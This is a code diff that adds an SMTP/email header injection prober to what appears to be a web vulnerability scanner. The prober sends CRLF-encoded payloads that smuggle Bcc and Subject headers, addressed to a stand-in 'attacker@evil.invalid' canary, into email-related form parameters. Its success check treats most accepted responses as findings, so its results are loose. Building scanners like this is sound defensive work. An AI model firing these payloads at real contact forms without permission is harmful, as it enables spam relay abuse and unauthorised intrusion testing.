@@ -226,6 +226,11 @@ class CRLFScanner(BaseScanner):
             for r in xss_prober.probe(url):
                 all_results.append(r)
 
+            # SMTP / email header injection
+            for r in SMTPHeaderInjectionProber(session=self.session, results=self.results).probe(url):
+                self.report_finding(**r) if r else None
+                all_results.append(r)
+
         return all_results
 
 class HeaderInjectionProber:
@@ -709,3 +714,82 @@ class CRLFXSSProber(BaseScanner):
                     },
                 }
         return None
+
+
+# =============================================================================
+# SMTP / Email Header Injection Prober
+# =============================================================================
+
+class SMTPHeaderInjectionProber(BaseScanner):
+    """
+    SMTP header injection — contact/mail form parametrelerine CR/LF + extra header enjekte et.
+    E-posta iletişim formlarında To/CC/BCC manipülasyonu ve spam relay tespiti.
+    """
+
+    name = "smtp_header_injection"
+
+    _CRLF_SEQS = ["\r\n", "\n", "%0d%0a", "%0a", "%0d%250a", "%250d%250a"]
+
+    def probe(self, url: str) -> List[Dict]:
+        """E-posta gönderen form parametrelerini SMTP header injection'a karşı test et."""
+        import urllib.parse
+        results: List[Dict] = []
+        parsed = urllib.parse.urlparse(url)
+        params = [p for p, _ in urllib.parse.parse_qsl(parsed.query)]
+
+        # E-posta ile ilişkili parametre adları
+        email_params = [
+            p for p in params
+            if any(kw in p.lower() for kw in ("email", "mail", "to", "from", "reply", "cc", "bcc", "sender", "recipient"))
+        ] or params[:3]
+
+        canary_email = "attacker@evil.invalid"
+
+        for param in email_params:
+            for seq in self._CRLF_SEQS:
+                # BCC injection
+                payload = f"victim@test.invalid{seq}Bcc: {canary_email}"
+                injected = self.inject_param(url, param, payload)
+                try:
+                    resp = self.session.post(injected, data={param: payload}, timeout=8)
+                except Exception:
+                    try:
+                        resp = self.session.get(injected, timeout=8)
+                    except Exception:
+                        continue
+
+                text = resp.text or ""
+                # Success heuristics: form accepted (200/302) and no error about invalid email
+                if resp.status_code in (200, 201, 302, 303) and not any(
+                    err in text.lower() for err in ("invalid email", "invalid address", "error")
+                ):
+                    results.append({
+                        "vuln_type": "SMTP Header Injection",
+                        "url": url,
+                        "severity": "High",
+                        "param": param,
+                        "payload": payload[:120],
+                        "evidence": f"BCC injection accepted (status {resp.status_code}, seq={repr(seq)})",
+                        "description": "Email form parameter accepted CRLF-separated BCC header — spam relay possible.",
+                    })
+                    return results
+
+                # Subject injection
+                subject_payload = f"Test Subject{seq}Subject: INJECTED-{canary_email}"
+                injected2 = self.inject_param(url, param, subject_payload)
+                try:
+                    resp2 = self.session.get(injected2, timeout=8)
+                except Exception:
+                    continue
+                if resp2.status_code in (200, 201, 302, 303) and "injected" in (resp2.text or "").lower():
+                    results.append({
+                        "vuln_type": "SMTP Header Injection (Subject)",
+                        "url": url,
+                        "severity": "Medium",
+                        "param": param,
+                        "payload": subject_payload[:120],
+                        "evidence": f"Subject injection reflected (status {resp2.status_code})",
+                    })
+                    return results
+
+        return results
